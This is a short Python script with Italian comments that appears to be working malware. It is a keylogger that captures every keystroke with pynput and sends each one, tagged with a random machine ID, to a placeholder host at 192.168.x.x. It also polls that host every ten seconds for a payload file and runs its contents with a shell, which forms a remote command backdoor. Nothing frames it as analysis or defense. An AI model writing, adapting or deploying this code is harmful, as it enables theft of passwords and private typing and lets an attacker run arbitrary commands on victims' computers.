import time
import requests
import subprocess
from pynput import keyboard
import random
import string

# Genera un codice univoco casuale
def genera_codice_univoco(length=6):
    letters_and_digits = string.ascii_letters + string.digits
    return ''.join(random.choice(letters_and_digits) for i in range(length))

codice_univoco = genera_codice_univoco()  # Genera il codice al momento dell'avvio

print(f"Codice PC: {codice_univoco}")

# HTTP
def send_request(key):
    try:
        # Converti il tasto premuto in stringa
        key_str = str(key).replace("'", "")
        url = f'http://192.168.x.x/{codice_univoco}/{key_str}'
        response = requests.get(url)
        print(f'Richiesta inviata a {url} stato: {response.status_code}')
    except Exception as e:
        print(f'Error: {e}')

# esegui lo script
def controlla_leggi_esegui_script(url):
    try:
        response = requests.get(url)
        response.raise_for_status()
        script_contenuto = response.text.strip()
        print(f"Script scaricato:\n{script_contenuto}")
        comando = f"{script_contenuto}"
        subprocess.run(comando, shell=True)
    except requests.exceptions.RequestException as e:
        print(f"Errore HTTP: {e}")
    except subprocess.CalledProcessError as e:
        print(f"Errore nell'esecuzione del comando: {e}")
    except Exception as e:
        print(f"Errore: {e}")

# pressione tasto
def on_press(key):
    try:
        send_request(key.char)
    except AttributeError:
        # Gestisce i tasti speciali come Shift, Ctrl, ecc.
        send_request(key)

# ascolta keyboard
listener = keyboard.Listener(on_press=on_press)
listener.start()

# loop 
while True:
    controlla_leggi_esegui_script("http://192.168.x.x/payloads_httpcmd/default.txt")
    time.sleep(10)
